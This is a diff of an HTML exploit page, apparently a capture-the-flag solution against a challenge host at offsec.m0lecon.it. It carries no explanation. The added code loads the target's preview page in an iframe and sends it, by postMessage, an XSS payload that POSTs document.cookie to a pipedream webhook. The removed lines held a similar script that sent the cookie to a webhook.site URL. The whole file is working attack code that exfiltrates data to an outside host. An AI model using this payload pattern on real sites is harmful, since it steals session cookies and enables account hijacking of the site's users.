@@ -1,10 +1,31 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
+    <body>
+        <iframe
+            id="f"
+            src="https://b39ea9bd-a48a-4d7a-a07e-3339eddff0bd.offsec.m0lecon.it/preview"
+        ></iframe>
+        <script>
+            const WEBHOOK =
+                "https://eorpvwpcvsuauqy.m.pipedream.net";
+            const payload = `<img src=x onerror="
+              (async function() {
+                var WEBHOOK = '${WEBHOOK}';
+                
+                await fetch(WEBHOOK, {
+                  method: 'POST',
+                  mode: 'no-cors',
+                  keepalive: true,
+                  body: JSON.stringify(document.cookie)
+                });
+              })();
+            ">`;
 
-
-<script>
-fetch("https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28?c="+document.cookie)
-</script>
-
-</body>
+            document.getElementById("f").onload = () => {
+                document
+                    .getElementById("f")
+                    .contentWindow.postMessage({ html: payload }, "*");
+            };
+        </script>
+    </body>
 </html>
